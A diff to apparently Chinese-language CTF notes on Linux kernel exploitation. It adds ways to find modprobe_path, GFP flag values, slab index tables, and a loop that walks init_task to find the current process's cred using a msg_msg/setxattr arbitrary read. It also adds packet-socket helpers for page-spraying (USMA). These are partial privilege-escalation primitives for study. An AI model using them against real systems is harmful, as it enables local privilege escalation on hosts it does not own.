@@ -164,6 +164,8 @@ panic=1 oops=panic
 
 ## 0x07. 寻找modprobe_path地址
 
+### 方法1 通过函数偏移寻找
+
 我们无法通过`cat /proc/kallsyms`来找到`modprobe_path`的地址。幸运的是，在`__request_module`中，存在一个对`modprobe_path`的引用。由此，我们可以从`/proc/kallsyms`中找到`__request_module`函数的地址，并使用`gdb`连接到`kernel`，查看该函数附近的汇编代码，即可找到`modprobe_path`的地址~
 
 具体如下：
@@ -179,6 +181,17 @@ panic=1 oops=panic
 如上所示，箭头所指的地方就是`modprobe_path`的地址的引用。
 
 通过如上方式，我们就可以获得`modprobe_path`的地址。
+
+### 方法2 通过搜索字符串寻找
+
+我们知道默认情况下，`modprobe_path`为`/sbin/modprobe`。那么可以直接在`gdb`中搜索这个字符串即可。
+
+一般来说我们可以找到两个值：
+
+- 其中一个属于内核代码段的为`modprobe_path`的地址
+- 另一个为`modprobe_path`的地址这一页映射到直接映射段上的地址
+
+![image-20250227094215449](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesimage-20250227094215449.png)
 
 ## 0x08. 回到用户态起shell的板子
 
@@ -423,6 +436,51 @@ void *kmem_cache_alloc_trace(struct kmem_cache *cachep, gfp_t flags, size_t size
 
 ![image-20241125152811254](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesimage-20241125152811254.png)
 
+```c
+  ===========================================================================================================
+      Start addr    |   Offset   |     End addr     |  Size   | VM area description
+  ===========================================================================================================
+                    |            |                  |         |
+   0000000000000000 |    0       | 00007fffffffffff |  128 TB | user-space virtual memory, different per mm
+  __________________|____________|__________________|_________|______________________________________________
+                    |            |                  |         |
+   0000800000000000 | +128    TB | ffff7fffffffffff | ~16M TB | ... huge
+                    |            |                  |         | virtual memory addresses up to the -128 TB
+                    |            |                  |         | starting offset of kernel mappings.
+  __________________|____________|__________________|_________|_____________________________________________
+ Kernel-space virtual memory, shared between all processes: ____________________________________________________________|_______________________________________________
+                    |            |                  |         |
+   ffff800000000000 | -128    TB | ffff87ffffffffff |    8 TB | ... guard hole, also reserved for hypervisor
+   ffff880000000000 | -120    TB | ffff887fffffffff |  0.5 TB | LDT remap for PTI
+   ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory 
+   ffffc88000000000 |  -55.5  TB | ffffc8ffffffffff |  0.5 TB | ... unused hole
+   ffffc90000000000 |  -55    TB | ffffe8ffffffffff |   32 TB | vmalloc/ioremap space (vmalloc_base)
+   ffffe90000000000 |  -23    TB | ffffe9ffffffffff |    1 TB | ... unused hole
+   ffffea0000000000 |  -22    TB | ffffeaffffffffff |    1 TB | virtual memory map (vmemmap_base)
+   ffffeb0000000000 |  -21    TB | ffffebffffffffff |    1 TB | ... unused hole
+   ffffec0000000000 |  -20    TB | fffffbffffffffff |   16 TB | KASAN shadow memory
+  __________________|____________|__________________|_________|______________________________________________
+ Identical layout to the 56-bit one from here on:
+____________________________________________________________|_______________________________________________
+                    |            |                  |         |
+   fffffc0000000000 |   -4    TB | fffffdffffffffff |    2 TB | ... unused hole
+                    |            |                  |         | vaddr_end for KASLR
+   fffffe0000000000 |   -2    TB | fffffe7fffffffff |  0.5 TB | cpu_entry_area mapping
+   fffffe8000000000 |   -1.5  TB | fffffeffffffffff |  0.5 TB | ... unused hole
+   ffffff0000000000 |   -1    TB | ffffff7fffffffff |  0.5 TB | %esp fixup stacks
+   ffffff8000000000 | -512    GB | ffffffeeffffffff |  444 GB | ... unused hole
+   ffffffef00000000 |  -68    GB | fffffffeffffffff |   64 GB | EFI region mapping space
+   ffffffff00000000 |   -4    GB | ffffffff7fffffff |    2 GB | ... unused hole
+   ffffffff80000000 |   -2    GB | ffffffff9fffffff |  512 MB | kernel text mapping
+   ffffffff80000000 |-2048    MB |                  |         |
+   ffffffffa0000000 |-1536    MB | fffffffffeffffff | 1520 MB | module mapping space
+   ffffffffff000000 |  -16    MB |                  |         |
+      FIXADDR_START | ~-11    MB | ffffffffff5fffff | ~0.5 MB | kernel-internal fixmap range
+   ffffffffff600000 |  -10    MB | ffffffffff600fff |    4 kB | legacy vsyscall ABI
+   ffffffffffe00000 |   -2    MB | ffffffffffffffff |    2 MB | ... unused hole
+  __________________|____________|__________________|_________|______________________________________________
+```
+
 ## 0x10. 子进程和父进程使用pipe传输数据
 
 解决了一直一来的一个困惑，使用`pipe`就可以了
@@ -530,19 +588,362 @@ __attribute__((naked)) long simple_clone(int flags, int (*fn)(void *))
 }
 ```
 
+## 0x17. kmalloc类函数分配的flags
 
+由于`IDA`反编译后的`flags`为常数，我们有时需要知道`flags`的值，而实际上根据内核版本有所不同。
+
+`linux 5.11`版本下的[定义](https://elixir.bootlin.com/linux/v5.14.21/source/include/linux/gfp.h)（`include/linux/gfp_types.h`）如下：
+
+```c
+#define ___GFP_DMA		0x01u  // 分配来自 DMA 兼容的内存区域（主要用于 ISA 设备）
+#define ___GFP_HIGHMEM		0x02u  // 允许分配来自高端内存（HighMem），适用于 32 位系统
+#define ___GFP_DMA32		0x04u  // 限制分配的内存必须位于 32 位地址空间（低于 4GB），用于 DMA 设备
+#define ___GFP_MOVABLE		0x08u  // 允许分配的内存是可移动的，可用于 Page Migration
+#define ___GFP_RECLAIMABLE	0x10u  // 分配的内存是可回收的（如 `slab` 缓存）
+#define ___GFP_HIGH		0x20u  // 允许使用高优先级页面，适用于紧急情况
+#define ___GFP_IO		0x40u  // 允许进行 IO 相关的内存回收操作
+#define ___GFP_FS		0x80u  // 允许文件系统回收内存（如 `shrink_cache`）
+#define ___GFP_ZERO		0x100u  // 分配的内存会被清零
+#define ___GFP_ATOMIC		0x200u  // 原子分配，不会阻塞（适用于中断上下文）
+#define ___GFP_DIRECT_RECLAIM	0x400u  // 允许直接回收（`direct reclaim`），可阻塞等待回收
+#define ___GFP_KSWAPD_RECLAIM	0x800u  // 允许 `kswapd` 进程回收内存
+#define ___GFP_WRITE		0x1000u  // 允许分配的页面用于写操作（如 `mmap`）
+#define ___GFP_NOWARN		0x2000u  // 禁止在分配失败时打印 `warn` 信息
+#define ___GFP_RETRY_MAYFAIL	0x4000u  // 允许重试，但仍可能失败
+#define ___GFP_NOFAIL		0x8000u  // 必须成功，不返回 `NULL`，可能会触发 OOM
+#define ___GFP_NORETRY		0x10000u  // 失败时不重试，适用于时间敏感的情况
+#define ___GFP_MEMALLOC		0x20000u  // 允许使用 `min_free_kbytes` 预留内存
+#define ___GFP_COMP		0x40000u  // 允许分配复合页（compound page），如 HugePages
+#define ___GFP_NOMEMALLOC	0x80000u  // 避免使用 `memalloc` 预留池
+#define ___GFP_HARDWALL		0x100000u  // 受 `cpuset` 限制，仅在特定 `cpuset` 内存节点上分配
+#define ___GFP_THISNODE		0x200000u  // 强制仅在当前 NUMA 节点分配，不跨节点查找
+#define ___GFP_ACCOUNT		0x400000u  // 使 `kmemcg`（Kernel Memory Cgroup）进行内存记账
+#define ___GFP_ZEROTAGS		0x800000u  // 在 `KASAN` 开启的情况下，不初始化 shadow memory
+#define ___GFP_SKIP_KASAN_POISON	0x1000000u  // 在 `KASAN` 监测下，跳过 `slab` 污染标记
+#ifdef CONFIG_LOCKDEP
+#define ___GFP_NOLOCKDEP	0x2000000u  // 关闭 `lockdep` 依赖检测（仅在 `CONFIG_LOCKDEP` 启用时生效）
+#else
+#define ___GFP_NOLOCKDEP	0  // 未启用 `CONFIG_LOCKDEP` 时，此标志无效
+#endif
+```
+
+而当前最新版本的内核`linux 6.13`采取的是`enum`来定义如上标志位，大部分值差不多，此处不表。
+
+而`GFP_KERNEL`的定义如下：
+
+```c
+#define GFP_KERNEL	(__GFP_RECLAIM | __GFP_IO | __GFP_FS)
+```
+
+其中`__GFP_RECLAIM`的定义如下：
+
+```c
+#define __GFP_RECLAIM ((__force gfp_t)(___GFP_DIRECT_RECLAIM|___GFP_KSWAPD_RECLAIM))
+```
+
+即`GFP_RECLAIM`的值为`0x400 | 0x800`，等于`0xC00`。
+
+由此`GFP_KERNEL`的值为`0xC00 | 0x40 | 0x80`，等于`0xCC0`。
+
+根据上述方法，我们可知常见的`flags`和值的对应关系如下：
+
+- `GFP_KERNEL`：`0xCC0`
+- `GFP_KERNEL_ACCOUNT`：`0x0x400CC0`
+
+- `GFP_KERNEL | __GFP_ZERO`：`0xDC0`
+
+## 0x18. kmem_caches中index和size的对应
+
+实际上由如下方式（`include/linux/slab.h`）计算：
+
+```c
+/*
+ * Figure out which kmalloc slab an allocation of a certain size
+ * belongs to.
+ * 0 = zero alloc
+ * 1 =  65 .. 96 bytes
+ * 2 = 129 .. 192 bytes
+ * n = 2^(n-1)+1 .. 2^n
+ *
+ * Note: __kmalloc_index() is compile-time optimized, and not runtime optimized;
+ * typical usage is via kmalloc_index() and therefore evaluated at compile-time.
+ * Callers where !size_is_constant should only be test modules, where runtime
+ * overheads of __kmalloc_index() can be tolerated.  Also see kmalloc_slab().
+ */
+static __always_inline unsigned int __kmalloc_index(size_t size,
+						    bool size_is_constant)
+{
+	if (!size)
+		return 0;
+
+	if (size <= KMALLOC_MIN_SIZE)
+		return KMALLOC_SHIFT_LOW;
+
+	if (KMALLOC_MIN_SIZE <= 32 && size > 64 && size <= 96)
+		return 1;
+	if (KMALLOC_MIN_SIZE <= 64 && size > 128 && size <= 192)
+		return 2;
+	if (size <=          8) return 3;
+	if (size <=         16) return 4;
+	if (size <=         32) return 5;
+	if (size <=         64) return 6;
+	if (size <=        128) return 7;
+	if (size <=        256) return 8;
+	if (size <=        512) return 9;
+	if (size <=       1024) return 10;
+	if (size <=   2 * 1024) return 11;
+	if (size <=   4 * 1024) return 12;
+	if (size <=   8 * 1024) return 13;
+	if (size <=  16 * 1024) return 14;
+	if (size <=  32 * 1024) return 15;
+	if (size <=  64 * 1024) return 16;
+	if (size <= 128 * 1024) return 17;
+	if (size <= 256 * 1024) return 18;
+	if (size <= 512 * 1024) return 19;
+	if (size <= 1024 * 1024) return 20;
+	if (size <=  2 * 1024 * 1024) return 21;
+	if (size <=  4 * 1024 * 1024) return 22;
+	if (size <=  8 * 1024 * 1024) return 23;
+	if (size <=  16 * 1024 * 1024) return 24;
+	if (size <=  32 * 1024 * 1024) return 25;
+
+	if ((IS_ENABLED(CONFIG_CC_IS_GCC) || CONFIG_CLANG_VERSION >= 110000)
+	    && !IS_ENABLED(CONFIG_PROFILE_ALL_BRANCHES) && size_is_constant)
+		BUILD_BUG_ON_MSG(1, "unexpected size in kmalloc_index()");
+	else
+		BUG();
+
+	/* Will never be reached. Needed because the compiler may complain */
+	return -1;
+}
+#define kmalloc_index(s) __kmalloc_index(s, true)
+```
+
+可以看`return`的结果即为数组的`index`。
+
+## 0x19. 内核堆在未开启slab_freelist_random时的情况
+
+记录一下，是从高地址分配到低地址。和用户态是反着来的，需要注意。
+
+## 0x1A. 通过init_task寻找当前cred的地址
+
+`init_task`是`struct task_struct`结构体，其是一个非常庞大的结构体，同样也非常难以定位和寻找里面的偏移。
+
+其结构体如下（摘抄常用部分）：
+
+```c
+struct task_struct {
+	...
+    ...
+	struct list_head		tasks;
+    struct plist_node		pushable_tasks;
+	...
+    ...
+	pid_t				pid;
+	pid_t				tgid;
+	unsigned long			stack_canary;
+	...
+    ...
+	const struct cred __rcu		*real_cred;
+	const struct cred __rcu		*cred;
+    ...
+    ...
+    char				comm[TASK_COMM_LEN];
+	...
+    ...
+}
+```
+
+每个进程都有一个`task_struct`结构体。其中，每个这样的结构体都有自己的`cred`结构体的指针。
+
+因此，我们的思路分为三步：
+
+- 通过`init_task`这样的`struct task_struct`结构体，遍历别的进程的`task_struct`结构体
+- 比对每个`struct task_struct`中的`pid`或者`comm`是否为当前进程的，若是，则找到了当前进程
+- 通过当前进程的`cred`指针即可找到`cred`的地址
+
+### 遍历 task_struct 结构体
+
+实际上，`task_struct`结构体中的`struct list_head tasks`是一个双向链表。定义如下：（很多地方都有比如`msg_msg`）
+
+```c
+struct list_head {
+	struct list_head *next;
+    struct list_head *prev;
+};
+```
+
+而每个`task_struct`中的`struct list_head tasks`中的两个指针，都指向其他进程的`task_struct`中的`struct list_head tasks`处。意味着，不同进程的`task_struct`结构体是通过`struct list_head tasks`中的两个指针连接起来的，草图如下：
+
+![image-20250306192945836](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesimage-20250306192945836.png)
+
+这意味着我们可以通过该`task`中的任意一个指针来找到下一个进程的`task_struct`结构体的`list_head`，并减去`task`的偏移，即可获得下一个进程的`task_struct`的地址。
+
+笔者本题目中（笔者并不清楚每个环境中，该值是否一样），`task`相对于`task_struct`起始位置的偏移为`0x298`，那么即可通过如下方式从`init_task`遍历到下一个`task_struct`：
+
+- 使用`init_task`加上`0x298`（这里也可以是`0x2a0`）
+- 读取该地址上的值
+- 使用该值减去`0x298`（这里一定是`0x298`）
+
+### 比对每个进程的 pid 或者 comm
+
+有两种方法比对是否找到了当前进程：
+
+- 其一是通过`pid`，这可以直接根据`task_struct`偏移处的`pid`和进程本身的`pid`进行比对。
+- 其二是通过`comm`字符数组，可以通过`prctl(PR_SET_NAME, "ltfall")`这样的方式来将自身进程的`comm`字符数组设置为任何醒目的字符。
+
+寻找这二者也很简单。`pid`和`tgid`是和`canary`相邻的，`canary`的特性使其非常醒目。
+
+而`comm`默认情况为`swapper/0`，且其常就位于`cred`下方。
+
+这里也记录一下笔者当前题目的偏移：
+
+- `pid`为`0x390`(`0x398`)
+- `comm`为`0x550`
+
+### 从当前进程的task_struct找到cred地址
+
+在`comm`上方可以找到。且其常常如下所示：
+
+```c
+pwndbg> tele 0xffffffff81c33060
+00:0000│  0xffffffff81c33060 ◂— 4
+01:0008│  0xffffffff81c33068 ◂— 0
+02:0010│  0xffffffff81c33070 ◂— 0
+03:0018│  0xffffffff81c33078 ◂— 0
+04:0020│  0xffffffff81c33080 ◂— 0
+05:0028│  0xffffffff81c33088 ◂— 0
+06:0030│  0xffffffff81c33090 ◂— 0xffffffffff
+07:0038│  0xffffffff81c33098 ◂— 0xffffffffff
+```
+
+又例如：
+
+```c
+pwndbg> tele 0xffff88800ec62cc0
+00:0000│  0xffff88800ec62cc0 ◂— 2
+01:0008│  0xffff88800ec62cc8 ◂— 0
+02:0010│  0xffff88800ec62cd0 ◂— 0
+03:0018│  0xffff88800ec62cd8 ◂— 0
+04:0020│  0xffff88800ec62ce0 ◂— 0
+05:0028│  0xffff88800ec62ce8 ◂— 0
+06:0030│  0xffff88800ec62cf0 ◂— 0xffffffffff
+07:0038│  0xffff88800ec62cf8 ◂— 0xffffffffff
+```
+
+笔者这里的偏移是`0x538/0x540`。
+
+### 一段示例
+
+```c
+init_task += kernel_offset;
+leak_info("init_task", init_task);
+
+size_t read_pid = getpid();
+size_t cur_task = init_task;
+size_t cur_cred = 0;
+size_t *task_task = NULL;
+
+int pid_index = 114;
+int tgid_index = 115;
+
+int next_index = 84;
+int cred_index = 167;
+
+while (1)
+{
+    memset(buffer, 0, 0x4000);
+    buffer[0] = buffer[1] = 0;
+    buffer[2] = 1;
+    buffer[3] = 0x1000 - 0x30 + 0x1000 - 8;
+    buffer[5] = 0;
+
+    buffer[4] = cur_task - 8;
+    setxattr("/exploit", "ltfall", buffer, 0x40, 0);
+
+    memset(buffer, 0, 0x4000);
+    int res = msgrcv(msg_id[0], buffer, 0x1000 - 0x30 + 0x1000 - 8, 0, MSG_NOERROR | MSG_COPY | IPC_NOWAIT);
+    if (res < 0x1000 - 0x30 + 0x1000 - 8)
+        err_exit("No such long rcv.");
+
+    task_task = ((size_t)buffer + 8) + 0x1000 - 0x30;
+    // leak_content(buffer, 0x2000 / 8);
+    leak_info("thread_info", task_task[0]);
+    leak_info("pid", task_task[tgid_index]);
+    leak_info("next", task_task[next_index]);
+    leak_info("cred", task_task[cred_index]);
+
+    if((task_task[tgid_index] & 0xffffffff) == read_pid){
+        success("find task_struct.");
+        cur_cred= task_task[cred_index];
+        leak_info("cur_cred", cur_cred);
+        break;
+    }
+
+    cur_task = task_task[next_index] - 0x298;
+    leak_info("cur_task", cur_task);
+}
+```
+
+## 0x1B. gdb调试qemu启动的内核时，在用户态查看内核态的数据
+
+笔者调试内核时，警察会遇到如下场景：
+
+笔者希望查看`exp`某一行前后的变化，例如笔者`exp`某一行是`setxattr`修改某个`obj`的内容，若直接下断点到内核中的函数，则难以定位。若直接在用户态查看内核数据，可能会出现如下情况：
+
+```c
+pwndbg> tele 0xffffffffc0002480
+<Could not read memory at 0xffffffffc0002480>
+```
+
+经过笔者实测，**这个原因和`kpti`的开启有关，而和`smep/smap`的开启无关**。这可能是因为用户页表中此时没有内核态的代码映射导致的。因此，解决的方法就是到`qemu`的启动脚本中手动关闭`kpti`即可，并不影响解题。
+
+```c
+pwndbg> tele 0xffffffffc0002480
+00:0000│  0xffffffffc0002480 —▸ 0xffff88800e278140 ◂— 0
+01:0008│  0xffffffffc0002488 —▸ 0xffff88800e278b80 ◂— 1
+02:0010│  0xffffffffc0002490 ◂— 0
+03:0018│  0xffffffffc0002498 —▸ 0xffff88800e278cc0 ◂— 2
+04:0020│  0xffffffffc00024a0 ◂— 0
+05:0028│  0xffffffffc00024a8 ◂— 0
+06:0030│  0xffffffffc00024b0 ◂— 0
+07:0038│  0xffffffffc00024b8 —▸ 0xffff88800e2783c0 ◂— 3
+```
+
+## 0x1C. pthread_create有很多噪声
+
+记一下吧，调的时候给我调坏了，结果最后发现是这个原因
+
+它`0x40`、`0x1000`等很多大小的`obj`的噪声都有。多注意一下。
+
+## 0x1D. 内核态中任意地址释放的一些心得
+
+弄`msg_msg`的时候，总是想着，既然我有任意地址释放，那为什么不可以直接释放掉`modprobe_path`，或者是`cred`结构体这些内容，然后直接`setxattr`改一下呢。
+
+后面想出来了，因为内核里能认识它是属于多大的`obj`，而像`modprobe_path`这种甚至不是`obj`，自然也无法释放掉之后再申请回来。
+
+像`cred`结构体，它前`8`个字节不为`0`（`msg_seg`的要求），那我只能将指针指向`cred`结构体的前`8`个字节了，然而那指向的也不是`cred`结构体了，所以其实不太能利用
 
 ## 0xFF. 内核保护配置记录
 
 ```bash
 CONFIG_SLAB=y 使用SLAB而不是SLUB
-CONFIG_SLUB=y 使用SLUB而不是SLAB
+CONFIG_SLUB=y 使用SLUB而不是SLAB，如今常用版本
+
 CONFIG_SLAB_FREELIST_RANDOM=y 开启Random Freelist
 CONFIG_SLAB_FREELIST_HARDENED=y 开启Hardened Freelist
 CONFIG_HARDENED_USERCOPY=y 开启Hardened Usercopy
+
 CONFIG_STATIC_USERMODEHELPER=y 开启Static Usermodehelper Path（modprobe_path 为只读，不可修改）
 CONFIG_STATIC_USERMODEHELPER_PATH=""
+
+CONFIG_MEMCG=y 决定是否开启MEMCG功能，以下如CONFIG_MEMCG_KMEM需要先开启该保护，默认开启
 CONFIG_MEMCG_KMEM=y 不同flags标志的obj将会隔离
+CONFIG_MEMCG_SWAP=y 控制内核是否支持Swap Extension， 限制cgroup中所有进程所能使用的交换空间总量 
+
+CONFIG_DEBUG_LIST=y 开启时内核会在链表操作中进行额外的检查，例如开启时msg_msg中的__list_del_entry函数会变成更严格的校验
+
+CONFIG_SHUFFLE_PAGE_ALLOCATOR=y 开启page allocator freelist随机化，具体作用待补充
 ```
 
 `rcS`中：
@@ -590,6 +991,7 @@ echo 2 > /proc/sys/kernel/kptr_restrict # 任何用户都不可以访问/proc/ka
 #include <sys/msg.h>
 #include <sys/wait.h>
 #include <semaphore.h>
+#include <arpa/inet.h>
 
 /**
  * 0x00. 基本函数
@@ -1211,6 +1613,7 @@ size_t ldt_seeking_memory(void *(*ldt_momdifier)(void *, size_t),
  */
 
 #define PGV_PAGE_NUM 1000
+#define PACKET_RX_RING 5
 #define PACKET_VERSION 10
 #define PACKET_TX_RING 13
 
@@ -1220,6 +1623,26 @@ struct tpacket_req
     unsigned int tp_block_nr;
     unsigned int tp_frame_size;
     unsigned int tp_frame_nr;
+};
+
+struct tpacket_req3 {
+	unsigned int	tp_block_size;	/* Minimal size of contiguous block */
+	unsigned int	tp_block_nr;	/* Number of blocks */
+	unsigned int	tp_frame_size;	/* Size of frame */
+	unsigned int	tp_frame_nr;	/* Total number of frames */
+	unsigned int	tp_retire_blk_tov; /* timeout in msecs */
+	unsigned int	tp_sizeof_priv; /* offset to private data area */
+	unsigned int	tp_feature_req_word;
+};
+
+struct sockaddr_ll {
+	unsigned short	sll_family;
+	uint16_t		sll_protocol;
+	int		sll_ifindex;
+	unsigned short	sll_hatype;
+	unsigned char	sll_pkttype;
+	unsigned char	sll_halen;
+	unsigned char	sll_addr[8];
 };
 
 /* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */
@@ -1385,6 +1808,78 @@ void prepare_pgv_system(void)
     }
 }
 
+/**
+ * 0x06. pgv与USMA相关
+ */
+
+#ifndef ETH_P_ALL
+#define ETH_P_ALL 0x0003
+#endif
+
+
+void packet_socket_rx_ring_init(int s, unsigned int block_size,
+                                unsigned int frame_size, unsigned int block_nr,
+                                unsigned int sizeof_priv, unsigned int timeout) {
+    int v = TPACKET_V3;
+    int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
+    if (rv < 0) {
+        puts("[X] setsockopt(PACKET_VERSION)");
+        exit(-1);
+    }
+ 
+    struct tpacket_req3 req;
+    memset(&req, 0, sizeof(req));
+    req.tp_block_size = block_size;
+    req.tp_frame_size = frame_size;
+    req.tp_block_nr = block_nr;
+    req.tp_frame_nr = (block_size * block_nr) / frame_size;
+    req.tp_retire_blk_tov = timeout;
+    req.tp_sizeof_priv = sizeof_priv;
+    req.tp_feature_req_word = 0;
+ 
+    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
+    if (rv < 0) {
+        puts("setsockopt(PACKET_RX_RING)");
+        exit(-1);
+    }
+}
+ 
+int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
+                        unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
+    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    if (s < 0) {
+        puts("socket(AF_PACKET)");
+        exit(-1);
+    }
+ 
+    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
+                               sizeof_priv, timeout);
+ 
+    struct sockaddr_ll sa;
+    memset(&sa, 0, sizeof(sa));
+    sa.sll_family = PF_PACKET;
+    sa.sll_protocol = htons(ETH_P_ALL);
+    sa.sll_ifindex = if_nametoindex("lo");
+    sa.sll_hatype = 0;
+    sa.sll_pkttype = 0;
+    sa.sll_halen = 0;
+ 
+    int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
+    if (rv < 0) {
+        puts("bind(AF_PACKET)");
+        exit(-1);
+    }
+ 
+    return s;
+}
+ 
+int alloc_pgv(int count, int size) {
+    return packet_socket_setup(size, 2048, count, 0, 100);
+}
+
+
+
 #endif // LTFALLKERNEL_H
+
 ```
 
